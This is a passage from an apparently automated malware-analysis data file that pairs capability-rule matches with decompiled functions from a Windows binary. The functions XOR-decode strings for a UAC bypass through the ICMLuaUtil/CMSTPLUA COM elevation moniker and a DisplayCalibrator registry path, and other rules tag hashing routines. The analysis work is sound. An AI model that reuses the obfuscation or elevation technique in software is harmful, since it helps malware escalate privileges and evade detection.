        "decompiled_code": "\nuint * __fastcall fcn.00406bb0(uint *param_1)\n\n{\n    *param_1 = 0xa0056;\n    param_1[1] = 0x73000a;\n    param_1[2] = 0xa0025;\n    param_1[3] = 0x250073;\n    *(param_1 + 4) = 0x56;\n    *(param_1 + 0x12) = *0x4238c4 ^ 0x56;\n    *(param_1 + 5) = *0x4238c4 >> 0x10 ^ 0x56;\n    *(param_1 + 0x16) = *0x4238c8 ^ 0x56;\n    *(param_1 + 6) = *0x4238c8 >> 0x10 ^ 0x56;\n    *(param_1 + 0x1a) = str.08:15:15._0_4_ ^ 0x56;\n    *(param_1 + 7) = str.08:15:15._0_4_ >> 0x10 ^ 0x56;\n    *(param_1 + 0x1e) = str.08:15:15._4_4_ ^ 0x56;\n    *(param_1 + 8) = 0;\n    return param_1;\n}\n",
        "token_count": 310
    },
    "00406d70": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00406d70(uint *param_1)\n\n{\n    *param_1 = 0x40001c;\n    param_1[1] = 0x640079;\n    param_1[2] = 0x70006c;\n    param_1[3] = 0x6e0073;\n    param_1[4] = 0x6e0079;\n    param_1[5] = 0x790032;\n    param_1[6] = 0x790064;\n    *(param_1 + 7) = 0x1c;\n    *(param_1 + 0x1e) = *0x4238f4 ^ 0x1c;\n    *(param_1 + 8) = *0x4238f4 >> 0x10 ^ 0x1c;\n    *(param_1 + 0x22) = *0x4238f8 ^ 0x1c;\n    *(param_1 + 9) = *0x4238f8 >> 0x10 ^ 0x1c;\n    *(param_1 + 0x26) = *0x4238fc ^ 0x1c;\n    *(param_1 + 10) = *0x4238fc >> 0x10 ^ 0x1c;\n    *(param_1 + 0x2a) = *0x423900 ^ 0x1c;\n    *(param_1 + 0xb) = *0x423900 >> 0x10 ^ 0x1c;\n    *(param_1 + 0x2e) = *0x423904 ^ 0x1c;\n    *(param_1 + 0xc) = *0x423904 >> 0x10 ^ 0x1c;\n    *(param_1 + 0x32) = *0x423908 ^ 0x1c;\n    *(param_1 + 0xd) = *0x423908 >> 0x10 ^ 0x1c;\n    *(param_1 + 0x36) = *0x42390c ^ 0x1c;\n    *(param_1 + 0xe) = 0;\n    return param_1;\n}\n",
        "token_count": 505
    },
    "00406e60": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00406e60(uint *param_1)\n\n{\n    *param_1 = 0x590005;\n    param_1[1] = 0x7d0060;\n    param_1[2] = 0x690075;\n    param_1[3] = 0x77006a;\n    param_1[4] = 0x770060;\n    param_1[5] = 0x60002b;\n    param_1[6] = 0x60007d;\n    *(param_1 + 7) = 5;\n    *(param_1 + 0x1e) = str.explorer.exe._0_4_ ^ 5;\n    *(param_1 + 8) = str.explorer.exe._0_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x22) = str.explorer.exe._4_4_ ^ 5;\n    *(param_1 + 9) = str.explorer.exe._4_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x26) = str.explorer.exe._8_4_ ^ 5;\n    *(param_1 + 10) = str.explorer.exe._8_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x2a) = str.explorer.exe._12_4_ ^ 5;\n    *(param_1 + 0xb) = str.explorer.exe._12_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x2e) = str.explorer.exe._16_4_ ^ 5;\n    *(param_1 + 0xc) = str.explorer.exe._16_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x32) = str.explorer.exe._20_4_ ^ 5;\n    *(param_1 + 0xd) = str.explorer.exe._20_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x36) = *0x423928 ^ 5;\n    *(param_1 + 0xe) = 0;\n    return param_1;\n}\n",
        "token_count": 499
    },
    "00406f50": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00406f50(uint *param_1)\n\n{\n    *param_1 = 0x30066;\n    param_1[1] = 0x16001e;\n    param_1[2] = 0x9000a;\n    param_1[3] = 0x30014;\n    param_1[4] = 0x480014;\n    param_1[5] = 0x1e0003;\n    param_1[6] = 0x660003;\n    *(param_1 + 7) = *0x42392a ^ 0x66;\n    *(param_1 + 0x1e) = str.Elevation:Administrator_new:._0_4_ ^ 0x66;\n    *(param_1 + 8) = str.Elevation:Administrator_new:._0_4_ >> 0x10 ^ 0x66;\n    *(param_1 + 0x22) = str.Elevation:Administrator_new:._4_4_ ^ 0x66;\n    *(param_1 + 9) = str.Elevation:Administrator_new:._4_4_ >> 0x10 ^ 0x66;\n    *(param_1 + 0x26) = str.Elevation:Administrator_new:._8_4_ ^ 0x66;\n    *(param_1 + 10) = str.Elevation:Administrator_new:._8_4_ >> 0x10 ^ 0x66;\n    *(param_1 + 0x2a) = str.Elevation:Administrator_new:._12_4_ ^ 0x66;\n    *(param_1 + 0xb) = str.Elevation:Administrator_new:._12_4_ >> 0x10 ^ 0x66;\n    *(param_1 + 0x2e) = str.Elevation:Administrator_new:._16_4_ ^ 0x66;\n    *(param_1 + 0xc) = str.Elevation:Administrator_new:._16_4_ >> 0x10 ^ 0x66;\n    *(param_1 + 0x32) = str.Elevation:Administrator_new:._20_4_ ^ 0x66;\n    *(param_1 + 0xd) = 0;\n    return param_1;\n}\n",
        "token_count": 512
    },
    "00407040": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "bypass UAC via ICMLuaUtil"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00407040(uint *param_1)\n\n{\n    *param_1 = 0x6a002f;\n    param_1[1] = 0x4a0043;\n    param_1[2] = 0x4e0059;\n    param_1[3] = 0x46005b;\n    param_1[4] = 0x410040;\n    param_1[5] = 0x6e0015;\n    param_1[6] = 0x42004b;\n    param_1[7] = 0x410046;\n    param_1[8] = 0x5c0046;\n    param_1[9] = 0x5d005b;\n    param_1[10] = 0x5b004e;\n    param_1[0xb] = 0x5d0040;\n    param_1[0xc] = 0x41000e;\n    param_1[0xd] = 0x58004a;\n    param_1[0xe] = 0x2f0015;\n    *(param_1 + 0xf) = *0x423966 ^ 0x2f;\n    *(param_1 + 0x3e) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._0_4_ ^ 0x2f;\n    *(param_1 + 0x10) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._0_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x42) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._4_4_ ^ 0x2f;\n    *(param_1 + 0x11) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._4_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x46) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._8_4_ ^ 0x2f;\n    *(param_1 + 0x12) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._8_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x4a) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._12_4_ ^ 0x2f;\n    *(param_1 + 0x13) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._12_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x4e) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._16_4_ ^ 0x2f;\n    *(param_1 + 0x14) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._16_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x52) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._20_4_ ^ 0x2f;\n    *(param_1 + 0x15) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._20_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x56) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._24_4_ ^ 0x2f;\n    *(param_1 + 0x16) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._24_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x5a) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._28_4_ ^ 0x2f;\n    *(param_1 + 0x17) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._28_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x5e) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._32_4_ ^ 0x2f;\n    *(param_1 + 0x18) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._32_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x62) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._36_4_ ^ 0x2f;\n    *(param_1 + 0x19) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._36_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x66) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._40_4_ ^ 0x2f;\n    *(param_1 + 0x1a) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._40_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x6a) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._44_4_ ^ 0x2f;\n    *(param_1 + 0x1b) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._44_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x6e) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._48_4_ ^ 0x2f;\n    *(param_1 + 0x1c) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._48_4_ >> 0x10 ^ 0x2f;\n    *(param_1 + 0x72) = str.3E5FC7F9_9A51_4367_9063_A120244FBEC7._52_4_ ^ 0x2f;\n    *(param_1 + 0x1d) = 0;\n    return param_1;\n}\n",
        "token_count": 1696
    },
    "00407240": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00407240(uint *param_1)\n\n{\n    *param_1 = 0x10006b;\n    param_1[1] = 0x2e0058;\n    param_1[2] = 0x2d005e;\n    param_1[3] = 0x5c0028;\n    param_1[4] = 0x52002d;\n    param_1[5] = 0x520046;\n    param_1[6] = 0x5e002a;\n    param_1[7] = 0x46005a;\n    param_1[8] = 0x58005f;\n    param_1[9] = 0x5c005d;\n    param_1[10] = 0x520046;\n    param_1[0xb] = 0x5d005b;\n    param_1[0xc] = 0x460058;\n    param_1[0xd] = 0x5a002a;\n    param_1[0xe] = 0x5b0059;\n    param_1[0xf] = 0x5f0059;\n    param_1[0x10] = 0x2d005f;\n    param_1[0x11] = 0x2e0029;\n    param_1[0x12] = 0x5c0028;\n    param_1[0x13] = 0x6b0016;\n    *(param_1 + 0x14) = *0x4239b6 ^ 0x6b;\n    *(param_1 + 0x52) = str.DisplayCalibrator._0_4_ ^ 0x6b;\n    *(param_1 + 0x15) = str.DisplayCalibrator._0_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x56) = str.DisplayCalibrator._4_4_ ^ 0x6b;\n    *(param_1 + 0x16) = str.DisplayCalibrator._4_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x5a) = str.DisplayCalibrator._8_4_ ^ 0x6b;\n    *(param_1 + 0x17) = str.DisplayCalibrator._8_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x5e) = str.DisplayCalibrator._12_4_ ^ 0x6b;\n    *(param_1 + 0x18) = str.DisplayCalibrator._12_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x62) = str.DisplayCalibrator._16_4_ ^ 0x6b;\n    *(param_1 + 0x19) = str.DisplayCalibrator._16_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x66) = str.DisplayCalibrator._20_4_ ^ 0x6b;\n    *(param_1 + 0x1a) = str.DisplayCalibrator._20_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x6a) = str.DisplayCalibrator._24_4_ ^ 0x6b;\n    *(param_1 + 0x1b) = str.DisplayCalibrator._24_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x6e) = str.DisplayCalibrator._28_4_ ^ 0x6b;\n    *(param_1 + 0x1c) = str.DisplayCalibrator._28_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x72) = str.DisplayCalibrator._32_4_ ^ 0x6b;\n    *(param_1 + 0x1d) = str.DisplayCalibrator._32_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x76) = *0x4239dc ^ 0x6b;\n    *(param_1 + 0x1e) = *0x4239dc >> 0x10 ^ 0x6b;\n    *(param_1 + 0x7a) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._0_4_ ^ 0x6b;\n    *(param_1 + 0x1f) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._0_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x7e) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._4_4_ ^ 0x6b;\n    *(param_1 + 0x20) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._4_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x82) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._8_4_ ^ 0x6b;\n    *(param_1 + 0x21) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._8_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x86) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._12_4_ ^ 0x6b;\n    *(param_1 + 0x22) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._12_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x8a) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._16_4_ ^ 0x6b;\n    *(param_1 + 0x23) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._16_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x8e) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._20_4_ ^ 0x6b;\n    *(param_1 + 0x24) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._20_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x92) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._24_4_ ^ 0x6b;\n    *(param_1 + 0x25) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._24_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x96) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._28_4_ ^ 0x6b;\n    *(param_1 + 0x26) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._28_4_ >> 0x10 ^ 0x6b;\n    *(param_1 + 0x9a) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._32_4_ ^ 0x6b;\n    *(param_1 + 0x27) = 0;\n    return param_1;\n}\n",
        "token_count": 1658
    },
    "00407510": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00407510(uint *param_1)\n\n{\n    *param_1 = 0x410005;\n    param_1[1] = 0x76006c;\n    param_1[2] = 0x690075;\n    param_1[3] = 0x7c0064;\n    param_1[4] = 0x640046;\n    param_1[5] = 0x6c0069;\n    param_1[6] = 0x770067;\n    param_1[7] = 0x710064;\n    param_1[8] = 0x77006a;\n    *(param_1 + 9) = 5;\n    *(param_1 + 0x26) = *0x4239dc ^ 5;\n    *(param_1 + 10) = *0x4239dc >> 0x10 ^ 5;\n    *(param_1 + 0x2a) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._0_4_ ^ 5;\n    *(param_1 + 0xb) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._0_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x2e) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._4_4_ ^ 5;\n    *(param_1 + 0xc) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._4_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x32) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._8_4_ ^ 5;\n    *(param_1 + 0xd) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._8_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x36) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._12_4_ ^ 5;\n    *(param_1 + 0xe) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._12_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x3a) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._16_4_ ^ 5;\n    *(param_1 + 0xf) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._16_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x3e) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._20_4_ ^ 5;\n    *(param_1 + 0x10) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._20_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x42) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._24_4_ ^ 5;\n    *(param_1 + 0x11) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._24_4_ >> 0x10 ^ 5;\n    *(param_1 + 0x46) = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration._28_4_ ^ 5;\n    *(param_1 + 0x12) = 0;\n    return param_1;\n}\n",
        "token_count": 759
    },
    "00407b20": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00407b20(uint *param_1)\n\n{\n    *param_1 = 0x680013;\n    param_1[1] = 0x210057;\n    param_1[2] = 0x240056;\n    param_1[3] = 0x270023;\n    param_1[4] = 0x510022;\n    param_1[5] = 0x21003e;\n    param_1[6] = 0x21002a;\n    param_1[7] = 0x3e0024;\n    param_1[8] = 0x210027;\n    param_1[9] = 0x710075;\n    param_1[10] = 0x2b003e;\n    param_1[0xb] = 0x2a0056;\n    param_1[0xc] = 0x3e0055;\n    param_1[0xd] = 0x500024;\n    param_1[0xe] = 0x2a0056;\n    param_1[0xf] = 0x510020;\n    param_1[0x10] = 0x570025;\n    param_1[0x11] = 0x2a0050;\n    param_1[0x12] = 0x240020;\n    param_1[0x13] = 0x13006e;\n    *(param_1 + 0x14) = *0x423aae ^ 0x13;\n    *(param_1 + 0x52) = *0x423ab0 ^ 0x13;\n    *(param_1 + 0x15) = *0x423ab0 >> 0x10 ^ 0x13;\n    *(param_1 + 0x56) = *0x423ab4 ^ 0x13;\n    *(param_1 + 0x16) = *0x423ab4 >> 0x10 ^ 0x13;\n    *(param_1 + 0x5a) = *0x423ab8 ^ 0x13;\n    *(param_1 + 0x17) = *0x423ab8 >> 0x10 ^ 0x13;\n    *(param_1 + 0x5e) = *0x423abc ^ 0x13;\n    *(param_1 + 0x18) = *0x423abc >> 0x10 ^ 0x13;\n    *(param_1 + 0x62) = *0x423ac0 ^ 0x13;\n    *(param_1 + 0x19) = *0x423ac0 >> 0x10 ^ 0x13;\n    *(param_1 + 0x66) = *0x423ac4 ^ 0x13;\n    *(param_1 + 0x1a) = *0x423ac4 >> 0x10 ^ 0x13;\n    *(param_1 + 0x6a) = *0x423ac8 ^ 0x13;\n    *(param_1 + 0x1b) = *0x423ac8 >> 0x10 ^ 0x13;\n    *(param_1 + 0x6e) = *0x423acc ^ 0x13;\n    *(param_1 + 0x1c) = *0x423acc >> 0x10 ^ 0x13;\n    *(param_1 + 0x72) = *0x423ad0 ^ 0x13;\n    *(param_1 + 0x1d) = *0x423ad0 >> 0x10 ^ 0x13;\n    *(param_1 + 0x76) = *0x423ad4 ^ 0x13;\n    *(param_1 + 0x1e) = *0x423ad4 >> 0x10 ^ 0x13;\n    *(param_1 + 0x7a) = *0x423ad8 ^ 0x13;\n    *(param_1 + 0x1f) = *0x423ad8 >> 0x10 ^ 0x13;\n    *(param_1 + 0x7e) = *0x423adc ^ 0x13;\n    *(param_1 + 0x20) = *0x423adc >> 0x10 ^ 0x13;\n    *(param_1 + 0x82) = *0x423ae0 ^ 0x13;\n    *(param_1 + 0x21) = *0x423ae0 >> 0x10 ^ 0x13;\n    *(param_1 + 0x86) = *0x423ae4 ^ 0x13;\n    *(param_1 + 0x22) = *0x423ae4 >> 0x10 ^ 0x13;\n    *(param_1 + 0x8a) = *0x423ae8 ^ 0x13;\n    *(param_1 + 0x23) = *0x423ae8 >> 0x10 ^ 0x13;\n    *(param_1 + 0x8e) = *0x423aec ^ 0x13;\n    *(param_1 + 0x24) = *0x423aec >> 0x10 ^ 0x13;\n    *(param_1 + 0x92) = str.iI._f_a_fe_b._0_4_ ^ 0x13;\n    *(param_1 + 0x25) = str.iI._f_a_fe_b._0_4_ >> 0x10 ^ 0x13;\n    *(param_1 + 0x96) = str.iI._f_a_fe_b._4_4_ ^ 0x13;\n    *(param_1 + 0x26) = str.iI._f_a_fe_b._4_4_ >> 0x10 ^ 0x13;\n    *(param_1 + 0x9a) = *0x423af8 ^ 0x13;\n    *(param_1 + 0x27) = 0;\n    return param_1;\n}\n",
        "token_count": 1384
    },
    "0040ebf0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "hash data using SHA224",
            "hash data using SHA256"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ebf0(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    bool bVar9;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar9 = arg_ch != 0;\n    *arg_8h = 0;\n    uVar6 = 0x1f83d9ab;\n    arg_8h[1] = 0;\n    uVar7 = 0x510e527f;\n    uVar1 = 0xbb67ae85;\n    if (bVar9) {\n        uVar1 = 0x367cd507;\n    }\n    uVar4 = 0xa54ff53a;\n    uVar2 = 0x3c6ef372;\n    if (bVar9) {\n        uVar2 = 0x3070dd17;\n    }\n    uVar5 = 0x5be0cd19;\n    if (bVar9) {\n        uVar6 = 0x64f98fa7;\n    }\n    uVar8 = 0x9b05688c;\n    if (bVar9) {\n        uVar8 = 0x68581511;\n        uVar7 = 0xffc00b31;\n        uVar5 = 0xbefa4fa4;\n    }\n    if (arg_ch != 0) {\n        uVar4 = 0xf70e5939;\n    }\n    uVar3 = 0x6a09e667;\n    if (arg_ch != 0) {\n        uVar3 = 0xc1059ed8;\n    }\n    arg_8h[2] = uVar3;\n    arg_8h[3] = uVar1;\n    arg_8h[4] = uVar2;\n    arg_8h[5] = uVar4;\n    arg_8h[6] = uVar7;\n    arg_8h[7] = uVar8;\n    arg_8h[8] = uVar6;\n    arg_8h[9] = uVar5;\n    arg_8h[0x1a] = arg_ch;\n    return 0;\n}\n",
        "token_count": 541
    },
    "004041e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004041e0(uint16_t *param_1, uint32_t param_2)\n\n{\n    uint16_t uVar1;\n    \n    for (; uVar1 = *param_1,  uVar1 != 0; param_1 = param_1 + 1) {\n        if (0x60 < uVar1) {\n            uVar1 = uVar1 - 0x20;\n        }\n        param_2 = (param_2 >> 0xd | param_2 << 0x13) + uVar1;\n    }\n    return param_2;\n}\n",
        "token_count": 135
    },
    "00407df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00407df0(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "00407e2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00407e2d(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uchar *puVar2;\n    uint unaff_retaddr;\n    \n    uVar1 = in_EAX + (&stack0x00000004 + -in_EAX & 0xf) | -CARRY4(in_EAX, &stack0x00000004 + -in_EAX & 0xf);\n    if (uVar1 < 0x1000) {\n        *(&stack0x00000000 + -uVar1) = unaff_retaddr;\n        return;\n    }\n    puVar2 = &stack0x00000004;\n    do {\n        puVar2 = puVar2 + -0x1000;\n        uVar1 = uVar1 - 0x1000;\n    } while (0xfff < uVar1);\n    *(puVar2 + (-4 - uVar1)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 228
    },
    "00408220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408220(uint *arg_8h)\n\n{\n    fcn.0040eb40(arg_8h + 1);\n    arg_8h[0x1c] = 0;\n    fcn.0040eda0(arg_8h + 0x1d, 400);\n    *arg_8h = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "00408260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408260(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t *puVar6;\n    uint var_20h;\n    uint var_10h;\n    \n    iVar4 = 0;\n    if (0x20 < arg_10h) {\n        return -0x3c;\n    }\n    do {\n        if (0x100 < iVar4) {\n            iVar3 = -0x3c;\n            goto code_r0x0040836a;\n        }\n        iVar3 = fcn.004080b0(arg_8h);\n        if (iVar3 != 0) goto code_r0x0040836a;\n        iVar3 = *(arg_8h + 0x70);\n        if (iVar3 < 1) break;\n        puVar6 = arg_8h + 0x7c;\n        bVar2 = true;\n        do {\n            bVar1 = false;\n            if (puVar6[1] <= *puVar6) {\n                bVar1 = bVar2;\n            }\n            iVar3 = iVar3 + -1;\n            puVar6 = puVar6 + 5;\n            bVar2 = bVar1;\n        } while (iVar3 != 0);\n        iVar4 = iVar4 + 1;\n    } while (!bVar1);\n    iVar4 = arg_8h + 4;\n    _var_20h = ZEXT816(0);\n    _var_10h = ZEXT816(0);\n    iVar3 = fcn.0040e980(iVar4, &var_20h);\n    if (iVar3 == 0) {\n        fcn.0040eb40(iVar4);\n        fcn.0040eb60(iVar4);\n        iVar3 = fcn.0040ebf0(iVar4, 0);\n        if (((iVar3 == 0) && (iVar3 = fcn.0040ecc0(iVar4, &var_20h, 0x20),  iVar3 == 0)) &&\n           (iVar3 = fcn.0040eb80(&var_20h, 0x20, &var_20h, 0),  iVar3 == 0)) {\n            if (0 < *(arg_8h + 0x70)) {\n                puVar5 = arg_8h + 0x7c;\n                do {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 5;\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < *(arg_8h + 0x70));\n            }\n            fcn.004124d0(arg_ch, &var_20h, arg_10h);\n            iVar3 = 0;\n        }\n    }\ncode_r0x0040836a:\n    fcn.0040eda0(&var_20h, 0x20);\n    return iVar3;\n}\n",
        "token_count": 697
    },
    "00408390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408390(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    arg_8h[0x1c] = 0;\n    fcn.004124f0(arg_8h + 0x1d, 0, 400);\n    *arg_8h = 0;\n    fcn.0040eb60(arg_8h + 1);\n    iVar1 = arg_8h[0x1c];\n    if (iVar1 < 0x14) {\n        arg_8h[iVar1 * 5 + 0x1d] = fcn.0040ed70;\n        arg_8h[iVar1 * 5 + 0x1e] = 0;\n        arg_8h[iVar1 * 5 + 0x20] = 0x20;\n        arg_8h[iVar1 * 5 + 0x21] = 1;\n        arg_8h[0x1c] = arg_8h[0x1c] + 1;\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "004086c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
